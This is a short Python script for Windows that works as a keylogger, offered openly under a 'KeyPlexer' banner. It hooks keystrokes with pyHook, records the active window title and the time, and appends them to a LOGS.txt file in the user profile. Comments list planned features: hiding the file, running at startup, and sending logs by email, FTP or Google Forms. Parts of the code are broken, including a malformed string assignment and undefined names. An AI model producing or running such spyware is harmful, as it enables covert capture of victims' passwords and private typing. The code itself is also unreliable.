#!/usr/bin/env python
from ctypes import *
from threading import Thread
import pythoncom
import pyHook
import win32clipboard
import os
import time
import datetime
import win32gui
import win32api



def intro():

   key_ascii=
    	"""
	 _  __             ____   _                        
        | |/ / ___  _   _ |  _ \ | |  ___ __  __ ___  _ __ 
        | ' / / _ \| | | || |_) || | / _ \\ \/ // _ \| '__|
        | . \|  __/| |_| ||  __/ | ||  __/ >  <|  __/| |   
        |_|\_\\___| \__, ||_|    |_| \___|/_/\_\\___||_|   
             		|___/                                  


		 ooo,    .---.
		 o`  o   /    |\________________
		o`   'oooo()  | ________   _   _)
		`oo   o` \    |/        | | | |
		  `ooo'   `---'         "-" |_|
		"""
    print key_ascii
    
intro()

file_logs = os.path.join(os.path.expandvars("%userprofile%"),"LOGS.txt")


def key_logging(key_thread, timer, file_name):
    
            global logging_output, logging_status,logging_date

            logging_output += "\n"
            logging_status = True
            main_thread_id = win32api.GetCurrentThreadId()
    
            w = win32gui
            current_window = w.GetWindowText (w.GetForegroundWindow())
            
            # open file to write
            # TO-DO save_to_file function
            output_file = open(file_name, 'w')
            output_file.write(logging_output)
            output_file.close()
            
            hooks_manager = pyHook.HookManager()
            hooks_manager.KeyDown = capture_key_strokes # captures keydown stores
            hooks_manager.HookKeyboard()
            pythoncom.PumpMessages()
            
            logging_status = False
            
            return True

def capture_key_strokes(event):

    global current_window, logging_output, logging_status

    if logging_status == False:
        return True

    logging_output = ""
    output_file = open(file_name,"a")
    wg = win32gui
    active_window = wg.GetWindowText (wg.GetForegroundWindow())

    if active_window != current_window:
        
        # Display the logs is a formatted way
        get_current_process()
        logging_date = str(datetime.datetime.now())
        
        logging_output += "\n" + "[*] " + " Date & Time: " + " [ " + logging_date +  " ]" + "\n"
        logging_output += "--" * len(logging_date) + "--\n"
        current_window = active_window
        output_file.write(logging_output)
    
    logging_output = ""

    # TO-DO : Back Space, Enter  
    if event.Ascii == 8:
        logging_output += "\b"
        
    elif event.Ascii == 13 or event.Ascii == 9:
        logging_output += "\n"
        
    else:
        # add 
        logging_output += str(chr(event.Ascii))
        
    # add logs to the file
    output_file.write(logging_output)
    output_file.close()
    
    return True 




# TO:DO

# Store the logs locally 
# Hide the file
# Parse the loggs into readable lines
# SEND LOGS TO EMAIL


# Additional Features
# Task Scheduler (windows) to run on startup.
# datetime module to make a new log file each day.
#Removed sys and logging imports and instead used standard file code
#Stores each line rather than one character per line. (separates lines when enter/tab is pressed)
#Removes characters when backspace is pressed so final output is coherent.
#Displays (in the log), the window the text was typed into eg 'youtube', 'google', 'microsoft word'.
# SEND LOGS TO FTP
# SEND LOGS TO GOOGLE FORMS
# Rewrite the function into Classes
